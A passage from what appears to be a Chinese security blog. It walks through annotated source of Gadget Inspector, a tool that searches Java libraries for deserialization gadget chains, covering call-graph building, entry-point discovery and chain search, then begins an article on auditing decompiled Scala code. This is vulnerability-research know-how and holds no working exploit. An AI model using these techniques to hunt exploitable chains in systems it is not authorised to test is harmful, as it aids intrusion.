class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKESTATIC:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKESPECIAL:</span><br><span class="line">                <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">stackIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> argTypes.length-<span class="number">1</span>-i;</span><br><span class="line">                        <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> argTypes[argIndex];</span><br><span class="line">                        <span class="comment">// 此时从栈顶向下的数据均为被调用方法的入参</span></span><br><span class="line">                        <span class="comment">// 根据栈索引从栈上取得参数</span></span><br><span class="line">                        Set&lt;String&gt; taint = getStackTaint(stackIndex);</span><br><span class="line">                        <span class="comment">// 如果该参数有污点标识符 </span></span><br><span class="line">                        <span class="keyword">if</span> (taint.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">// 遍历污点标识符</span></span><br><span class="line">                            <span class="keyword">for</span> (String argSrc : taint) &#123;</span><br><span class="line">                                <span class="comment">// 如果参数的污点标识符 不是arg开头 则直接报错退出，即调用方法的参数无法影响被调用方法的入参</span></span><br><span class="line">                                <span class="comment">// 这里直接抛出异常 是否存在问题</span></span><br><span class="line">                                <span class="comment">// 第一个参数不被受主调方法入参影响，直接退出针对该方法的分析，那么第二个参数如果受影响呢？</span></span><br><span class="line">                                <span class="keyword">if</span> (!argSrc.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">&quot;arg&quot;</span>)) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid taint arg: &quot;</span> + argSrc);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">// 确定`.`号的位置</span></span><br><span class="line">                                <span class="comment">// </span></span><br><span class="line">                                <span class="type">int</span> <span class="variable">dotIndex</span> <span class="operator">=</span> argSrc.indexOf(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                                <span class="type">int</span> srcArgIndex;</span><br><span class="line">                                String srcArgPath;</span><br><span class="line">                                <span class="comment">// 如果点号不存在则证明被调用方法的污点标识符由调用方法的参数直接传递</span></span><br><span class="line">                                <span class="keyword">if</span> (dotIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                                    <span class="comment">// 计算参数索引</span></span><br><span class="line">                                    srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>));</span><br><span class="line">                                    <span class="comment">// 参数路径为空 </span></span><br><span class="line">                                    srcArgPath = <span class="literal">null</span>;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="comment">// 计算参数索引 因为存在点号 证明该参数由对象间接传递 非直接传递</span></span><br><span class="line">                                    srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>, dotIndex));</span><br><span class="line">                                    <span class="comment">// 记录被调用方法的参数来自主调方法的参数的哪个属性</span></span><br><span class="line">                                    srcArgPath = argSrc.substring(dotIndex+<span class="number">1</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">// 构造调用图</span></span><br><span class="line">                                <span class="comment">// 主调方法句柄  被调用方法句柄   主调方法参数索引 主调方法参数传递路径  被调方法参数索引</span></span><br><span class="line">                                discoveredCalls.add(<span class="keyword">new</span> <span class="title class_">GraphCall</span>(</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="built_in">this</span>.owner), <span class="built_in">this</span>.name, <span class="built_in">this</span>.desc),</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc),</span><br><span class="line">                                        srcArgIndex,</span><br><span class="line">                                        srcArgPath,</span><br><span class="line">                                        argIndex));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 增加栈索引 继续获取下一个参数</span></span><br><span class="line">                        stackIndex += type.getSize();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>形成的方法间调用图将被存储在 CallGraphDiscovery.discoveredCalls 字段中，最终被持久化到 callgraph.dat 文件中。存储格式如下<br>主调方法所属类全类名|主调方法名|主调方法描述符|被调方法所属类全类名|被调方法名|被调方法描述符|主调方法参数索引|主调方法参数传递路径|被调方法参数索引<br>如：<br>com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;impl&#x2F;dtd&#x2F;XMLDTDDescription	<init>	(Lcom&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;xni&#x2F;XMLResourceIdentifier;Ljava&#x2F;lang&#x2F;String;)V	com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;xni&#x2F;XMLResourceIdentifier	getBaseSystemId	()Ljava&#x2F;lang&#x2F;String;	1		0<br>我们看 XMLDTDDescription 对应的构造函数，被调用的子方法是 id.getBaseSystemId()。getBaseSystemId的调用者id来自 XMLDTDDescription 构造函数的第一个参数，<br>即索引1。getLiteralSystemId 也有一个参数 this, 索引为0。 XMLDTDDescription的第一个参数将影响 getBaseSystemId 方法的第0个参数且是直接影响并无参数路径。<br>故形成的污染路径为 <code>1		0</code>   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">XMLDTDDescription</span><span class="params">(XMLResourceIdentifier id, String rootName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setValues(id.getPublicId(), id.getLiteralSystemId(), id.getBaseSystemId(), id.getExpandedSystemId());</span><br><span class="line">        <span class="built_in">this</span>.fRootName = rootName;</span><br><span class="line">        <span class="built_in">this</span>.fPossibleRoots = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="Source-点探测"><a href="#Source-点探测" class="headerlink" title="Source 点探测"></a>Source 点探测</h4><p>不同的反序列化类型具有不同的入口，Gadget Inspector 默认提供了两种类型的入口点探测类，分别是 JacksonSourceDiscovery 以及 SimpleSourceDiscovery。<br>我们以最常用的Java原生反序列化为例，即 SimpleSourceDiscovery。<br>逻辑就是根据已知的反序列化入口点取匹配被探测的方法，然后形成一个列表。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                         InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">SerializableDecider</span> <span class="variable">serializableDecider</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleSerializableDecider</span>(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;finalize&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If a class implements readObject, the ObjectInputStream passed in is considered tainted</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;readObject&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/io/ObjectInputStream;)V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using the proxy trick, anything extending serializable and invocation handler is tainted.</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/lang/reflect/InvocationHandler&quot;</span>))) &#123;</span><br><span class="line">                MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(</span><br><span class="line">                        clazz, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode() or equals() are accessible entry points using standard tricks of putting those objects</span></span><br><span class="line">        <span class="comment">// into a HashMap.</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;hashCode&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()I&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/lang/Object;)Z&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the</span></span><br><span class="line">        <span class="comment">// args are tainted.</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;groovy/lang/Closure&quot;</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">&quot;call&quot;</span>) || method.getName().equals(<span class="string">&quot;doCall&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最终形成的source点列表将被持久化存储在 sources.dat 文件中。文件格式如下：<br>方法所属类全类名|方法名|方法描述|污点参数索引  </p>
<h4 id="Gadget-Chain-构造"><a href="#Gadget-Chain-构造" class="headerlink" title="Gadget Chain 构造"></a>Gadget Chain 构造</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line">        <span class="comment">// 查找方法的所有实现</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">                inheritanceMap, methodMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ImplementationFinder</span> <span class="variable">implementationFinder</span> <span class="operator">=</span> config.getImplementationFinder(</span><br><span class="line">                methodMap, methodImplMap, inheritanceMap);</span><br><span class="line">        <span class="comment">// 持久化</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> Files.newBufferedWriter(Paths.get(<span class="string">&quot;methodimpl.dat&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">                writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(entry.getKey().getName());</span><br><span class="line">                writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                writer.write(entry.getKey().getDesc());</span><br><span class="line">                writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                    writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                    writer.write(method.getClassReference().getName());</span><br><span class="line">                    writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                    writer.write(method.getName());</span><br><span class="line">                    writer.write(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                    writer.write(method.getDesc());</span><br><span class="line">                    writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 加载调用图并合并</span></span><br><span class="line">        <span class="comment">// graphCallMap 通过主调方法名句柄映射其所有被调方法调用图的集合</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">GraphCall</span>.Factory())) &#123;</span><br><span class="line">            MethodReference.<span class="type">Handle</span> <span class="variable">caller</span> <span class="operator">=</span> graphCall.getCallerMethod();</span><br><span class="line">            <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">                Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                graphCalls.add(graphCall);</span><br><span class="line">                graphCallMap.put(caller, graphCalls);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                graphCallMap.get(caller).add(graphCall);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exploredMethods 记录所有被查找过的方法 避免重复搜索</span></span><br><span class="line">        Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 记录需要查找的source方法 每个source被当作一条GadgetChain</span></span><br><span class="line">        LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 加载入口点</span></span><br><span class="line">        <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">Source</span>.Factory())) &#123;</span><br><span class="line">            <span class="comment">// 封装入口点为一个link</span></span><br><span class="line">            <span class="type">GadgetChainLink</span> <span class="variable">srcLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainLink</span>(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将source点封装的 GadgetChain 加入到预处理列表中</span></span><br><span class="line">            methodsToExplore.add(<span class="keyword">new</span> <span class="title class_">GadgetChain</span>(Arrays.asList(srcLink)));</span><br><span class="line">            <span class="comment">// 将入口点加入到已查找集合中</span></span><br><span class="line">            exploredMethods.add(srcLink);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">iteration</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 迭代1000次记录一次</span></span><br><span class="line">            <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                LOGGER.info(<span class="string">&quot;Iteration &quot;</span> + iteration + <span class="string">&quot;, Search space: &quot;</span> + methodsToExplore.size());</span><br><span class="line">            &#125;</span><br><span class="line">            iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">GadgetChain</span> <span class="variable">chain</span> <span class="operator">=</span> methodsToExplore.pop();</span><br><span class="line">            <span class="comment">// 取得链中最后一个link</span></span><br><span class="line">            <span class="type">GadgetChainLink</span> <span class="variable">lastLink</span> <span class="operator">=</span> chain.links.get(chain.links.size()-<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 从link中获取到方法句柄，根据方法句柄获取到调用图集合</span></span><br><span class="line">            Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);</span><br><span class="line">            <span class="keyword">if</span> (methodCalls != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 遍历调用图</span></span><br><span class="line">                <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                    <span class="comment">// 如果调用这的参数索引与链中最后一个link的taintedArgIndex不同，则该方法调用不符合要求。</span></span><br><span class="line">                    <span class="comment">// 即需要调用者的参数可控</span></span><br><span class="line">                    <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 从调用图中找到被调用方法的句柄，然后查找该方法的所有重载方法</span></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());</span><br><span class="line">                    <span class="comment">// 遍历所有重载方法</span></span><br><span class="line">                    <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                        <span class="comment">// 将该方法重新封装成一个link 第一个参数为方法名句柄  第二个参数表示该方法哪一个参数可以被污染</span></span><br><span class="line">                        <span class="comment">// 在寻找下一个节点时需要保证 第二个参数 出现在调用图图中</span></span><br><span class="line">                        <span class="type">GadgetChainLink</span> <span class="variable">newLink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChainLink</span>(methodImpl, graphCall.getTargetArgIndex());</span><br><span class="line">                        <span class="keyword">if</span> (exploredMethods.contains(newLink)) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 形成新的GadgetChain </span></span><br><span class="line">                        <span class="type">GadgetChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GadgetChain</span>(chain, newLink);</span><br><span class="line">                        <span class="comment">// 如果该链的最后一个link是sink点，且满足污染关系 则认为找到了一条反序列化Gadgets链</span></span><br><span class="line">                        <span class="keyword">if</span> (isSink(methodImpl, graphCall.getTargetArgIndex(), inheritanceMap)) &#123;</span><br><span class="line">                            discoveredGadgets.add(newChain);</span><br><span class="line">                            <span class="comment">// 否则继续寻找</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// 将新链加入到需要寻找的列表中</span></span><br><span class="line">                            methodsToExplore.add(newChain);</span><br><span class="line">                            <span class="comment">// 将新的方法节点加入到已经被查找过的方法集合中</span></span><br><span class="line">                            exploredMethods.add(newLink);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 输出</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> Files.newOutputStream(Paths.get(<span class="string">&quot;gadget-chains.txt&quot;</span>));</span><br><span class="line">             <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(outputStream, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (GadgetChain chain : discoveredGadgets) &#123;</span><br><span class="line">                printGadgetChain(writer, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOGGER.info(<span class="string">&quot;Found &#123;&#125; gadget chains.&quot;</span>, discoveredGadgets.size());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>关于如何 连接Gadget Chain，这里举例说明。<br>以下两个类A与类B分别实现了 Serializable 接口，并且都重写了 readObject 方法。 这里将类A的 readObject 方法作为 Source 点。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">B</span> <span class="variable">var2</span> <span class="operator">=</span> (B) var1.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> var1.readUTF();</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在进行 Gadget Chain 构造时首先会将 A 类的 readObject 方法封装为一个 GadgetChainLink 对象，其第一个参数为 readObject 方法名的句柄，<br>第二个参数为参数污点索引（1）。然后将这个 GadgetChainLink 添加到一个数组中再封装到 GadgetChain 中。<br>搜索时先从 GadgetChain 中取出列表中最后一个 link，也就是 A 类 readObject 方法封装的 GadgetChainLink 对象。然后获取到方法名，<br>并从调用图映射中通过方法名取得类A方法readObject 的所有调用图，我们的例子中只有一个，即调用类B的readObject方法。<br>这个调用图在 callgraph.dat 中是这样的：<br>A   readObject  (Ljava&#x2F;io&#x2F;ObjectInputStream;)V  B   readObject   ()Ljava&#x2F;lang&#x2F;Object;     1         0<br>取得了调用图后会比较类A的 readObject 方法的参数污点索引（1）是否与调用图中的调用者参数索引（1）一致，在给出的例子中两者均为1，表明污点可以传递下去。<br>然后查找类B的所有实现类是否重写了readObject方法，如果存在重写，则所有的重写方法都将被封装为新的 GadgetChainLink 对象，并将它们添加到 GadgetChain 中。<br>这个新的 GadgetChain 接受两个参数，第一个参数为前一个链，第二个参数为当前链的最后一个link。 然后判断该链的最后一个link是否是sink点，如果是则认为找到了一条反序列化Gadgets链，否则继续寻找。<br>新生成的 GadgetChain 会被添加到 methodsToExplore 中参加下一轮循环。  </p>
]]></content>
      <categories>
        <category>漏挖工具</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Java Gadgets</tag>
        <tag>Gadget Inspector</tag>
        <tag>反序列化利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>Scala代码审计从入门到入坟</title>
    <url>/archives/2a377379.html</url>
    <content><![CDATA[<h1 id="Scala代码审计从入门到入坟"><a href="#Scala代码审计从入门到入坟" class="headerlink" title="Scala代码审计从入门到入坟"></a>Scala代码审计从入门到入坟</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Scala 是一门多范式的编程语言，集成了面向对象编程和函数式编程的多种特性。函数式编程抽象的理论基础也让这门语言变得抽象起来，初学者需要花更多的时间去理解其特有概念以及众多的语法糖。<code>Scala</code>是一门运行在JVM平台上的语言，其源码编译结果符合<code>Java</code>字节码规范，所以可以被反编译为<code>Java</code>代码。在进行<code>Scala</code>代码审计的过程中，审计者很少有机会直面其源码，大多数时候都是被反编译为<code>Java</code>的代码所支配。<code>Scala</code>与<code>Java</code>毕竟是两门语言，反编译成<code>Java</code>代码的后果便是丧失了动态调试的能力（这为审计者带来了不小的麻烦），反编译后产生的中间代码、临时变量等辅助结构更是极大得降低了代码的可读性。本文将带领诸位抽丝剥茧逐步梳理出<code>Scala</code>各语法结构与<code>Java</code>语法结构对应关系，然后以两个漏洞的分析结尾。  </p>
<span id="more"></span>
<h2 id="特殊语法结构识别"><a href="#特殊语法结构识别" class="headerlink" title="特殊语法结构识别"></a>特殊语法结构识别</h2><p>除了循环、条件判断、面向对象等基础语法外，<code>Scala</code>还提供了极具特色的语法结构，如：模式匹配、隐式转换、传名调用、函数柯里化、伴生对象、特质、提取器、函数式编程等。本章不会重点着墨于这些语法的介绍，而是向读者展示在将<code>Scala</code>源程序反编译为<code>Java</code>代码后产生的那些不太常规的语法结构以及一些奇怪的变量（MODULE$&#x2F;$outer&#x2F;package&#x2F;$init$）等。</p>
<h3 id="伴生对象"><a href="#伴生对象" class="headerlink" title="伴生对象"></a>伴生对象</h3><blockquote>
<p>本节将会涉及到特殊变量<code>MODULE$</code>的含义   </p>
</blockquote>
<p><code>Scala</code>中没有类似<code>Java</code>中<code>static</code>关键字，其实现<code>static</code>关键字功能是通过被称为伴生对象的概念。<br>伴生对象是类自身定义的单个实例，可以被理解为当前类的一个单例对象（并不显式依赖一个类，可独立存在），以下代码展示了一个类的伴生对象：  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singletons</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">var</span> llac: <span class="type">String</span> = <span class="string">&quot;九敏啊，我是伴生类的私有属性，我被伴生对象调用了&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">callSingleField</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">   <span class="comment">// 调用伴生对象的私有属性</span></span><br><span class="line">    println(<span class="type">Singletons</span>.call)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Singletons</span> 